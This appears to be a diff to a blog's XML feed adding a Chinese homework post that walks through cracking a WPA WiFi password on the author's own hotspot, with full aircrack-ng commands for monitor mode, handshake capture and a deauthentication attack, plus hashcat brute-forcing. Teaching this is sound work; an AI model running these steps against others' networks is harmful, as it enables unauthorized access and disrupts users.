@@ -4,6 +4,27 @@
   
     
     <entry>
+      <title>aircrack-ng+hashcat的wifi口令爆破</title>
+      <link href="/p/aircrack-ng-wifi/"/>
+      <url>/p/aircrack-ng-wifi/</url>
+      
+        <content type="html"><![CDATA[<p>最近的安全学作业，反正都写了，就顺便发了.</p><p>PS：文章中的每一步都是攻击自己搭建的热点，仅供学习，<strong>请勿擅自攻击别人的wifi</strong>（甩锅</p><h1>正文</h1><h2 id="前提">前提</h2><p><code>aircrack-ng</code>要能成功爆破其实是有条件的：</p><ol><li>wifi使用弱口令，或wifi口令在攻击者的爆破字典中；</li><li>攻击时wifi信号要足够强，而且有人在连接。</li></ol><h2 id="环境">环境</h2><p>在这个文章的实验中，<code>aircrack-ng</code>是在Ubuntu18.04（VB虚拟机）中运行的；</p><p>获取连接报文后是在Windows10（宿主机）的<code>hashcat</code>中进行爆破；</p><p>另外由于在虚拟机中，所以连接wifi使用的是usb外接网卡。</p><h2 id="过程">过程</h2><ol><li><p>安装<code>aircrack-ng</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install aircrack-ng</span><br></pre></td></tr></table></figure></li><li><p>在运行<code>aircrack-ng</code>前似乎要关闭一些服务（我是做实验+虚拟机的所以随便关，实际情况的话请考虑是不是真的要关闭这些服务）</p><img src="/p/aircrack-ng-wifi/1.PNG" class="" title="img_1"><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo service avahi-daemon stop</span></span><br><span class="line">sudo systemctl <span class="built_in">disable</span> avahi-daemon  <span class="comment"># think about it!</span></span><br><span class="line">sudo airmon-ng check <span class="built_in">kill</span></span><br></pre></td></tr></table></figure><p>因为我是虚拟机外接网卡的，所以还要开个网卡：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iwconfig  <span class="comment"># to get name, e.g. wlx********4f9</span></span><br><span class="line">sudo ifconfig wlx********4f9 up</span><br></pre></td></tr></table></figure></li><li><p>开启网卡的监听模式：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng start wlx********4f9</span><br></pre></td></tr></table></figure><p>如果再次<code>iwconfig</code>看到网卡名字变成<code>wlan0mon</code>的话就是开成功了</p><img src="/p/aircrack-ng-wifi/2.PNG" class="" title="img_2"></li><li><p>首先<code>sudo airodump-ng wlan0mon</code>一下找攻击对象</p><img src="/p/aircrack-ng-wifi/3-16359297880532.PNG" class="" title="img_3-16359297880532"><p>记住<code>CH</code>和<code>BSSID</code>，然后捕获其连接数据报文，比如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo airodump-ng -c &lt;CH&gt; --bssid &lt;BSSID&gt; -w &lt;output_name&gt; wlan0mon</span></span><br><span class="line">sudo airodump-ng -c 11 --bssid 2A:**:**:**:**:22 -w ./<span class="built_in">test</span> wlan0mon</span><br></pre></td></tr></table></figure><img src="/p/aircrack-ng-wifi/4-16359299506943.PNG" class="" title="img_4-16359299506943"><p>首先要确保被攻击的wifi有用户在使用（即<code>STATION</code>下要有东西），然后因为要抓的是连接包，所以需要<code>aireplay-ng</code>攻击一下强制用户重连（不然就要慢慢等新用户上线了），记住上面的<code>BSSID</code>和<code>STATION</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo aireplay-ng -0 2 -a &lt;BSSID&gt; -c &lt;STATION&gt; wlan0mon</span></span><br><span class="line">sudo aireplay-ng -0 2 -a 2A:**:**:**:**:22 -c 24:**:**:**:**:47 wlan0mon</span><br></pre></td></tr></table></figure><p>如果成功的话就会在<code>airodump-ng</code>窗口的右上角显示<code>WPA handshake</code>：</p><img src="/p/aircrack-ng-wifi/5-16359299871394.PNG" class="" title="img_5-16359299871394"><p>然后会得到一个<code>test-01.cap</code>的数据包</p></li><li><p>获取连接包后就可以爆破wifi口令了，这里选择使用<code>hashcat</code>爆破（因为<code>hashcat</code>可以调用显卡），需要先用<code>cap2hccapx</code>把<code>cap</code>包转成<code>hashcat</code>可用的<code>hccapx</code>包，<code>cap2hccapx</code>可以在<a href="https://github.com/hashcat/hashcat-utils/releases/">github</a>下载（由于虚拟机不能调显卡，所以后面操作都是在宿主机运行的）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># now in windows!</span></span><br><span class="line"><span class="comment"># cap2hccapx.exe input.cap output.hccapx</span></span><br><span class="line">cap2hccapx.exe <span class="built_in">test-01</span>.cap test.hccapx</span><br></pre></td></tr></table></figure><img src="/p/aircrack-ng-wifi/6-16359299962465.PNG" class="" title="img_6-16359299962465"></li><li><p>然后就可以用<code>hashcat</code>愉快地爆破了~~，由于那个wifi是我自己开的，所以知道是8位纯数字，~~于是就直接爆破8位数字了：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe <span class="literal">-a</span> <span class="number">3</span> <span class="literal">-m</span> <span class="number">2500</span> path\to\test.hccapx ?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure><p>爆破用时大概1min+</p><img src="/p/aircrack-ng-wifi/7-16359300015946.PNG" class="" title="img_7-16359300015946"></li></ol><h1>参考</h1><p><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/52.html">https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/52.html</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Linux </tag>
+            
+            <tag> Misc </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>EasyCrypt编译安装踩坑记录</title>
       <link href="/p/easy-crypt-install/"/>
       <url>/p/easy-crypt-install/</url>
@@ -17,8 +38,6 @@
             <tag> Crypto </tag>
             
             <tag> Linux </tag>
-            
-            <tag> Latex </tag>
             
         </tags>
       
